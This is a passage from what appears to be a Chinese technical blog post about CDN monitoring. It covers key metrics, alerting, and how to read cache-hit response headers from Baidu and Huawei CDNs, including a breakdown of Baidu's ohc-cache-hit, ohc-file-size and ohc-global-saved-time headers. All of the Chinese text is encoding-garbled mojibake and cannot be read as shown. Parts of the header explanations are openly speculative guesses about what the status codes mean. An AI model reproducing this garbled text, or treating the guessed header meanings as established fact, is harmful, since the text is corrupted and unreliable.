<span class="hljs-bullet">2.</span> å¹³å‡å“åº”æ—¶é—´ï¼ˆ&lt;100msä¸ºä¼˜ï¼‰
<span class="hljs-bullet">3.</span> å¸¦å®½ä½¿ç”¨ï¼ˆå¼‚å¸¸çªå¢éœ€é¢„è­¦ï¼‰
<span class="hljs-bullet">4.</span> é”™è¯¯ç‡ï¼ˆ5xxé”™è¯¯&lt;0.1%ï¼‰
<span class="hljs-bullet">5.</span> å›æºæ¯”ä¾‹ï¼ˆ&lt;10%ä¸ºä½³ï¼‰


å‘Šè­¦ç­–ç•¥ï¼š
<span class="hljs-bullet">-</span> å®æ—¶å‘Šè­¦ï¼šé”™è¯¯ç‡çªå¢
<span class="hljs-bullet">-</span> å®šæ—¶æŠ¥å‘Šï¼šæ¯æ—¥å‘½ä¸­ç‡æ±‡æ€»
<span class="hljs-bullet">-</span> å®¹é‡é¢„è­¦ï¼šå¸¦å®½ä½¿ç”¨è¾¾80%
</code></pre>
<h2 data-id="heading-20"><strong>å…­ã€æœ€ä½³å®è·µ</strong></h2>
<h3 data-id="heading-21"><strong>6.1</strong> Nginx ä¼˜åŒ–</h3>
<p>ç°ä»£ Nginx ä¼˜åŒ–å®è·µï¼šæ¶æ„ã€é…ç½®ä¸æ€§èƒ½è°ƒä¼˜: <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FJvSx9rkCqHWtFVil90dJqw" target="_blank" title="https://mp.weixin.qq.com/s/JvSx9rkCqHWtFVil90dJqw" ref="nofollow noopener noreferrer">mp.weixin.qq.com/s/JvSx9rkCqâ€¦</a></p>
<h3 data-id="heading-22"><strong>6.2</strong> ä¹‹å®¶ä½¿ç”¨çš„ CDN ä¾›åº”å•†</h3>



















<table><thead><tr><th>ç™¾åº¦</th><th>Ageå¤´æ ‡è¯†è¾¹ç¼˜æ˜¯å¦æœ‰ç¼“å­˜åŠç¼“å­˜æ—¶é•¿ï¼›å­˜åœ¨è¡¨ç¤ºå‘½ä¸­è¾¹ç¼˜ç¼“å­˜ï¼Œä¸å­˜åœ¨è¡¨ç¤ºè¾¹ç¼˜æ²¡æœ‰ç¼“å­˜ï¼Œè¯·æ±‚å›äº†ä¸Šçº§æˆ–è€…æºç«™ï¼›Ohc-Global-Saved-Timeå¤´æ ‡è¯†å…¨å±€é¦–æ¬¡ç¼“å­˜æ—¶é—´ï¼Œå¯ä»¥é€šè¿‡è¯¥å“åº”å¤´åˆ¤æ–­ç¬¬ä¸€æ¬¡ç¼“å­˜æ—¶é—´ï¼Œå¦‚æœè¯¥å€¼å’Œè¯·æ±‚æ—¶é—´æ¥è¿‘æˆ–ç›¸ç­‰åˆ™è¯´æ˜è¯·æ±‚å›æºï¼Œæ ¼æ—å¨æ²»æ ‡å‡†æ—¶é—´ï¼›</th><th>Â </th><th>&lt; Age: 4&lt; Ohc-Global-Saved-Time: Thu, 14 Sep 2023 07:55:28 GMT</th><th><a href="https://link.juejin.cn?target=http%3A%2F%2Fpic-b.autoimg.cn" target="_blank" title="http://pic-b.autoimg.cn" ref="nofollow noopener noreferrer">pic-b.autoimg.cn</a></th></tr></thead><tbody><tr><td>åä¸º</td><td>æœ‰â€œx-hcs-proxy-typeâ€å¤´éƒ¨ï¼Œå€¼ä¸ºâ€œ1â€å³å‘½ä¸­ç¼“å­˜ï¼Œå€¼ä¸ºâ€œ0â€å³æœªå‘½ä¸­ç¼“å­˜ï¼Œä¸å†æŸ¥çœ‹å…¶å®ƒå¤´éƒ¨ï¼›</td><td>Â </td><td>ç¤ºä¾‹ç¼“å­˜å‘½ä¸­å¤´éƒ¨å¦‚ä¸‹x-hcs-proxy-type: 1</td><td>Â </td></tr></tbody></table>
<h3 data-id="heading-23"><strong>6.4 ç™¾åº¦ CDN å“åº”å¤´è§£æ</strong></h3>
<p><strong>1.</strong> <code>ohc-cache-hit: lf6ct205 [2], xaix205 [1]</code></p>
<p>å«ä¹‰ï¼šCDNç¼“å­˜å‘½ä¸­çŠ¶æ€å’Œè·¯å¾„è¿½è¸ª</p>
<p>è¯¦ç»†è§£è¯»ï¼š</p>
<ul>
<li>lf6ct205 [2]ï¼š</li>
<li>
<ul>
<li><code>lf6ct205</code>ï¼šè¡¨ç¤ºç¬¬ä¸€ä¸ªå“åº”èŠ‚ç‚¹ï¼ˆå¯èƒ½æ˜¯è¾¹ç¼˜èŠ‚ç‚¹ï¼‰çš„æ ‡è¯†</li>
<li><code>[2]</code>ï¼šç¼“å­˜å‘½ä¸­çŠ¶æ€ç ï¼Œå¸¸è§å«ä¹‰ï¼š</li>
<li>
<ul>
<li><code>0</code>ï¼šMISSï¼ˆæœªå‘½ä¸­ï¼Œå›æºï¼‰</li>
<li><code>1</code>ï¼šHITï¼ˆå®Œå…¨å‘½ä¸­ï¼‰</li>
<li><code>2</code>ï¼šPARTIAL_HIT/HIT_REVALIDATEDï¼ˆéƒ¨åˆ†å‘½ä¸­/éªŒè¯åå‘½ä¸­ï¼‰</li>
<li>è¿™é‡Œ<code>[2]</code>è¡¨ç¤ºè¯¥èŠ‚ç‚¹å¯èƒ½è¿›è¡Œäº†æ¡ä»¶éªŒè¯ï¼ˆIf-Modified-Since/If-None-Matchï¼‰åç¡®è®¤èµ„æºæœ‰æ•ˆ</li>
</ul>
</li>
</ul>
</li>
<li>xaix205 [1]ï¼š</li>
<li>
<ul>
<li><code>xaix205</code>ï¼šç¬¬äºŒä¸ªå“åº”èŠ‚ç‚¹ï¼ˆå¯èƒ½æ˜¯çˆ¶å±‚æˆ–ä¸­é—´å±‚èŠ‚ç‚¹ï¼‰çš„æ ‡è¯†</li>
<li><code>[1]</code>ï¼šè¡¨ç¤ºåœ¨è¯¥èŠ‚ç‚¹å®Œå…¨å‘½ä¸­ç¼“å­˜</li>
</ul>
</li>
</ul>
<p>Â </p>
<p>ç»¼åˆç†è§£ï¼šè¯·æ±‚ç»è¿‡äº†<code>xaix205â†’lf6ct205</code>ä¸¤çº§CDNèŠ‚ç‚¹ï¼Œä¸¤ä¸ªèŠ‚ç‚¹éƒ½å‘½ä¸­ç¼“å­˜ï¼Œå…¶ä¸­çˆ¶èŠ‚ç‚¹å®Œå…¨å‘½ä¸­ï¼Œè¾¹ç¼˜èŠ‚ç‚¹ç»è¿‡éªŒè¯åå‘½ä¸­ã€‚</p>
<p>Â </p>
<p><strong>2.</strong> <code>ohc-file-size: 2108</code></p>
<p>å«ä¹‰ï¼šCDN ç¼“å­˜çš„æ–‡ä»¶å¤§å°</p>
<p>è¯¦ç»†è§£è¯»ï¼š</p>
<ul>
<li>å•ä½ï¼šå­—èŠ‚ï¼ˆBytesï¼‰</li>
<li>å€¼ï¼š2108å­—èŠ‚ â‰ˆ 2.06KB</li>
<li>è¡¨ç¤ºCDNç¼“å­˜çš„è¿™ä¸ªèµ„æºæ–‡ä»¶çš„å®é™…å¤§å°</li>
<li>ç”¨äºç›‘æ§å’Œè¯Šæ–­ï¼Œç¡®è®¤ç¼“å­˜çš„æ–‡ä»¶ä¸æºç«™æ–‡ä»¶å¤§å°æ˜¯å¦ä¸€è‡´</li>
</ul>
<p>Â </p>
<p><strong>3.</strong> <code>ohc-global-saved-time: Thu, 11 Dec 2025 09:17:19 GMT</code></p>
<p>å«ä¹‰ï¼šèµ„æºåœ¨ CDN ä¸Šé¦–æ¬¡ç¼“å­˜çš„æ—¶é—´æˆ³</p>
<p>è¯¦ç»†è§£è¯»ï¼š</p>
<ul>
<li>æ ¼å¼ï¼šRFC 1123æ ¼å¼çš„GMTæ—¶é—´</li>
<li>æ—¶é—´å€¼ï¼š2025å¹´12æœˆ11æ—¥ 09:17:19ï¼ˆGMTï¼‰</li>
<li>æ³¨æ„ï¼šè¿™æ˜¯ä¸€ä¸ªæœªæ¥æ—¶é—´ï¼Œå¯èƒ½æœ‰ä»¥ä¸‹æƒ…å†µï¼š</li>
<li>
<ul>
<li>æ—¶é—´åŒæ­¥é—®é¢˜ï¼šæºç«™æˆ–CDNæœåŠ¡å™¨æ—¶é—´è®¾ç½®é”™è¯¯</li>
<li>ç¼“å­˜ç­–ç•¥é…ç½®ï¼šå¯èƒ½è®¾ç½®äº†å¾ˆé•¿çš„ç¼“å­˜æ—¶é—´ï¼ˆåˆ°2025å¹´ï¼‰</li>
<li>è°ƒè¯•/æµ‹è¯•ç¯å¢ƒï¼šå¯èƒ½æ˜¯æµ‹è¯•é…ç½®</li>
</ul>
</li>
<li>æ­£å¸¸æƒ…å†µä¸‹åº”è¯¥æ˜¯è¿‡å»çš„æ—¶é—´ç‚¹ï¼Œè¡¨ç¤ºèµ„æºä½•æ—¶è¢«ç¼“å­˜</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>